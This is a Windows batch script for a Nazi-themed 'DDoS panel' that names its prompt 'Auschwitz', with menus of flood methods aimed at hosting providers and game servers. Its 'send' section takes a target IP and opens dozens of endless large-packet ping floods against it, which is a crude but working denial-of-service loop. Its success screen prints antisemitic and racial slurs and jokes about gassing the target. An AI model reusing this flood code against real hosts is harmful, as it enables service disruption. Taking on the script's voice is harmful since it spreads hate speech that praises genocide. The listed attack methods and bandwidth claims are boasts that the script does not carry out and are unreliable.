[38;5;209;48;5;209m░[38;5;167;48;5;167m░[38;5;174;48;5;167m▒[38;5;167;48;5;167m░[38;5;209;48;5;209m░[38;5;209;48;5;173m░[38;5;209;48;5;209m░[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;209m░[38;5;209;48;5;203m░[38;5;209;48;5;167m▒[38;5;209;48;5;173m░[38;5;209;48;5;173m░[38;5;209;48;5;173m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m░[38;5;173;48;5;173m░[38;5;52;48;5;232m [38;5;16;48;5;16m▓[38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;209;48;5;131m▒[38;5;216;48;5;209m░[38;5;173;48;5;173m░[38;5;209;48;5;167m▒[38;5;209;48;5;130m░[38;5;209;48;5;131m▒[38;5;167;48;5;167m▒[38;5;204;48;5;167m▒[38;5;204;48;5;167m▒[38;5;204;48;5;1m [38;5;52;48;5;52m [38;5;52;48;5;16m [38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;52;48;5;232m [38;5;52;48;5;52m [38;5;52;48;5;52m [38;5;204;48;5;1m░[38;5;209;48;5;88m░[38;5;1;48;5;1m [38;5;209;48;5;130m▒[38;5;209;48;5;167m░[38;5;209;48;5;173m░[38;5;209;48;5;173m▒[38;5;209;48;5;167m▒[38;5;173;48;5;167m▒[38;5;173;48;5;131m▒[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;176;48;5;235m▒[38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;17;48;5;16m [38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;32;48;5;233m▒[38;5;231;48;5;231m▓[38;5;209;48;5;181m▒[38;5;173;48;5;173m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m░[38;5;209;48;5;167m░[38;5;167;48;5;131m▒[38;5;209;48;5;130m░[38;5;167;48;5;124m░[38;5;204;48;5;124m░[38;5;204;48;5;161m░[38;5;204;48;5;167m░[38;5;204;48;5;161m░[38;5;204;48;5;124m░[38;5;204;48;5;124m▒[38;5;209;48;5;131m▒[38;5;209;48;5;167m░[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m▒[38;5;209;48;5;167m░[38;5;209;48;5;173m░[38;5;209;48;5;167m▒[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;204;48;5;247m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;17;48;5;16m [38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;68;48;5;247m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;209;48;5;130m▒[38;5;209;48;5;131m▒[38;5;209;48;5;209m░[38;5;203;48;5;209m░[38;5;167;48;5;167m░[38;5;203;48;5;203m░[38;5;167;48;5;167m░[38;5;167;48;5;167m▒[38;5;167;48;5;131m▒[38;5;174;48;5;131m▒[38;5;167;48;5;130m▒[38;5;167;48;5;131m▒[38;5;167;48;5;131m▒[38;5;167;48;5;167m░[38;5;209;48;5;203m░[38;5;209;48;5;209m░[38;5;209;48;5;167m░[38;5;209;48;5;167m▒[38;5;209;48;5;131m▒[38;5;209;48;5;131m▒[38;5;224;48;5;224m [38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;198;48;5;255m▒[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;17;48;5;16m [38;5;17;48;5;16m [38;5;196;48;5;196m 
echo [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;196;48;5;196m [38;5;17;48;5;16m [38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;173;48;5;94m░[38;5;209;48;5;131m▒[38;5;167;48;5;167m▒[38;5;167;48;5;167m▒[38;5;167;48;5;167m░[38;5;167;48;5;167m░[38;5;167;48;5;167m░[38;5;167;48;5;167m░[38;5;203;48;5;203m░[38;5;203;48;5;203m░[38;5;203;48;5;203m░[38;5;209;48;5;203m░[38;5;209;48;5;173m░[38;5;209;48;5;131m▒[38;5;209;48;5;131m▒[38;5;209;48;5;131m▒[38;5;209;48;5;217m░[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;231;48;5;231m▓[38;5;209;48;5;241m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓[38;5;16;48;5;16m▓
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:attack
cls
timeout 1 >nul
echo                 [38;2;255;0;0m            ████[40;37m╗  
echo                 [38;2;255;0;0m            ████[40;37m║ 
echo                 [38;2;255;0;0m            ████[40;37m║   
echo                 [38;2;255;0;0m            ████[40;37m║  
echo                 [38;2;255;0;0m            ████████████████████[40;37m╗  
echo                 [38;2;255;0;0m            ████████████████████[40;37m║ 
echo                 [38;2;255;0;0m                            ████[40;37m║
echo                 [38;2;255;0;0m                            ████[40;37m║
echo                 [38;2;255;0;0m                            ████[40;37m║
echo                 [38;2;255;0;0m                            ████[40;37m║
echo                 [40;37m                            ╚═══╝
timeout 1 >nul
cls
echo                 [38;2;255;0;0m                    ████████████[40;37m╗
echo                 [38;2;255;0;0m                    ████████████[40;37m║
echo                 [38;2;255;0;0m                    ████[40;37m╔═══════╝
echo                 [38;2;255;0;0m                    ████[40;37m║
echo                 [38;2;255;0;0m                    ████[40;37m║  
echo                 [38;2;255;0;0m                    ████[40;37m║ 
echo                 [38;2;255;0;0m                    ████[40;37m║
echo                 [38;2;255;0;0m                    ████[40;37m║  
echo                 [38;2;255;0;0m            ████████████[40;37m║   
echo                 [38;2;255;0;0m            ████████████[40;37m║
echo                 [40;37m            ╚═══════════╝  
timeout 1 >nul
cls
echo                             [38;2;255;0;0m████[40;37m╗   [38;2;255;0;0m████████████[40;37m╗
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████████████[40;37m║
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m╔═══════╝
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████████████[40;37m╗  
echo                             [38;2;255;0;0m████████████████████[40;37m║ 
echo                             ╚═══════[38;2;255;0;0m████[40;37m╔═══[38;2;255;0;0m████[40;37m║
echo                                     [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [40;37m╚═══════════╝   ╚═══╝
timeout 1 >nul
cls
echo                             [38;2;255;0;0m████[40;37m╗   [38;2;255;0;0m████████████[40;37m╗
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████████████[40;37m║
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m╔═══════╝
echo                             [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████████████[40;37m╗  
echo                             [38;2;255;0;0m████████████████████[40;37m║ 
echo                             ╚═══════[38;2;255;0;0m████[40;37m╔═══[38;2;255;0;0m████[40;37m║
echo                                     [38;2;255;0;0m████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [38;2;255;0;0m████████████[40;37m║   [38;2;255;0;0m████[40;37m║
echo                             [40;37m╚═══════════╝   ╚═══╝
echo                         [40;37m╦ ╦╦ ╦╦╔╦╗╔═╗  [38;2;255;0;0m╔═╗╔═╗╦ ╦╔═╗╦═╗
echo                         [40;37m║║║╠═╣║ ║ ║╣   [38;2;255;0;0m╠═╝║ ║║║║║╣ ╠╦╝
ECHO                         [40;37m╚╩╝╩ ╩╩ ╩ ╚═╝  [38;2;255;0;0m╩  ╚═╝╚╩╝╚═╝╩╚═
timeout 1 >nul
cls
echo                        [40;37m ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ [38;2;255;0;0m ╔═╗╔╗╔╔═╗╔╦╗
echo                        [40;37m ╠═╣ ║  ║ ╠═╣║  ╠╩╗ [38;2;255;0;0m ╚═╗║║║║╣  ║ 
echo                        [40;37m ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ [38;2;255;0;0m ╚═╝╝╚╝╚═╝ ╩
timeout 1 >nul
goto sent

:sent
cls
echo [38;2;255;0;0m%user% [40;37mSuccessfully Gassed %ip_input%, Get Fucked Jew !
ECHO                         [40;37m ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔╦╗╔═╗╔╦╗╔═╗
ECHO                         [40;37m ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗ ║ ╠═╣ ║ ╚═╗
ECHO                         [40;37m ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝ ╩ ╩ ╩ ╩ ╚═╝
echo                     [40;37m  ═════════════════════════════════════════════
echo                      [40;37m username -[38;2;255;0;0m %user%
echo                      [40;37m ═════════════════════════════════════════════
echo                       [40;37mHost Hit / [38;2;255;0;0m%ip_input%
echo                       [40;37mMethod Used / [38;2;255;0;0m%method_input%
echo                       [40;37mVIP / [32mTrue
echo                      [40;37m GIGS SENT / [38;2;255;0;0m1gig per device you do the math nigger
echo                       [40;37mSent At / [38;2;255;0;0m%date% %time%
echo                      [40;37m Sent With / [38;2;255;0;0m%bot_count%
echo                       [40;37m═════════════════════════════════════════════
echo                       [40;37mTarget Successfully Punished to the chambers

set time_left=30s
echo COOLDOWN TIME LEFT: %time_left%
timeout 30 >nul

goto greeting

set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong

:OVH/NFO
cls
echo                           ╔═══════════════════════╗
echo                           ║OVH-ANGEL  NFO-RIOT    ║
echo                           ║OVH-STOMP  NFO-SLAM    ║
echo                           ║OVH-ABUSE  NFO-RENTLESS║
echo                           ║OVH-ICMP   NFO-DEATH   ║
echo                           ║OVH-FUCK   NFO-NULL    ║
echo                           ║OVH-CHAOS  KILLALL     ║
echo                           ║OVH-DEVIL  xxxxxxxx    ║
echo                           ║OVH-NUKE   xxxxxxxx    ║
echo                           ╚═══════════════════════╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:Layer7
cls
echo.
echo     [38;2;255;0;0m        ╔═════════╗                                    ╔════════╗
echo     [38;2;255;0;0m        ║[40;37mHTTPSKILL[38;2;255;0;0m║                                    ║[40;37mHTTPRIP [38;2;255;0;0m║     
echo     [38;2;255;0;0m        ╚═════════╝                                    ╚════════╝
echo.
echo     [38;2;255;0;0m                                ╔═════════╗
echo     [38;2;255;0;0m                                ║[40;37mHTTPGET [38;2;255;0;0m ║
echo     [38;2;255;0;0m                                ╚═════════╝
echo.
echo    [38;2;255;0;0m         ╔═════════╗                                    ╔═════════╗
echo     [38;2;255;0;0m        ║[40;37mHTTPFLOOD[38;2;255;0;0m║                                    ║[40;37mHTTPSTOMP[38;2;255;0;0m║
echo     [38;2;255;0;0m        ╚═════════╝                                    ╚═════════╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:HOME/OTHER
cls
echo       [38;2;255;0;0m                ╔════════════════════════╗
echo       [38;2;255;0;0m                ║ [40;37mR6-CRASH    RUST-STAB  [38;2;255;0;0m║    ╔═══════════╗
echo       [38;2;255;0;0m                ║ [40;37mFIVEM-DROP  COD-FREEZE [38;2;255;0;0m║    ║[40;37m[40;37mLDAP       [38;2;255;0;0m[38;2;255;0;0m[38;2;255;0;0m[38;2;255;0;0m║
echo       [38;2;255;0;0m                ║ [40;37mARK-255     ROBLOX-X   [38;2;255;0;0m║    ║[40;37mRAIL       [38;2;255;0;0m[38;2;255;0;0m[38;2;255;0;0m║
echo       [38;2;255;0;0m                ║ [40;37mFORTNITE    xxxxxxxx   [38;2;255;0;0m╚════╝           ║
echo       [38;2;255;0;0m                ║ [40;37mGAME-SLAM   xxxxxxxx   [38;2;255;0;0m╔════╗           ║
echo       [38;2;255;0;0m                ║ [40;37m2K-FREEZE   xxxxxxxx   [38;2;255;0;0m║    ║[40;37mUDP-KILL   [38;2;255;0;0m[38;2;255;0;0m║
echo       [38;2;255;0;0m                ║ [40;37mARK-LIFT    xxxxxxxx   [38;2;255;0;0m║    ║[40;37mSTD        [38;2;255;0;0m║
echo       [38;2;255;0;0m                ║ [40;37mAPEX-DOWN   xxxxxxxx   [38;2;255;0;0m║    ╚═══════════╝
echo       [38;2;255;0;0m                ║ [40;37mBRAWLHALLA  xxxxxxxx   [38;2;255;0;0m║
echo       [38;2;255;0;0m                ║ [40;37mMINECRAFT   xxxxxxxx   [38;2;255;0;0m║
echo       [38;2;255;0;0m                ╚════════════════════════╝
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong
:send
set /p METH=method:
set /p IP=IP:
set /p Port=Port:
set /p Time=time:
goto sending

:sending
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
ping localhost -n 1 >nul
start ping %IP% -t -l 65500
goto attack


:wrong
echo Command %o% not found.
set /p o=[40;37m[[38;2;255;0;0m%user%@Auschwitz[40;37m]:~# 
if %o%==help goto help 
if %o%==cls goto greeting 
if %o%==rules goto tos
if %o%==banners goto banners
if %o%==superior goto superior
if %o%==Auschwitz goto nazi
if %o%==hitler goto hitler
if %o%==methods goto methods
if %o%==putin goto putin
if %o%==attack goto attack
if %o%==OVH/NFO goto OVH/NFO
if %o%==Layer7 goto Layer7
if %o%==HOME/OTHER goto HOME/OTHER
if %o%==send goto send
if %o%==passwd goto chngpasw

if not %o%==help goto wrong
if not %o%==cls goto wrong
if not %o%==rules goto wrong
if not %o%==banners goto wrong
if not %o%==superior goto wrong
if not %o%==Auschwitz goto wrong
if not %o%==hitler goto wrong
if not %o%==methods goto wrong
if not %o%==putin goto wrong
if not %o%==attack goto wrong
if not %o%==OVH/NFO goto wrong
if not %o%==Layer7 goto wrong
if not %o%==HOME/OTHER goto wrong
if not %o%==send goto wrong
if not %o%==passwd goto wrong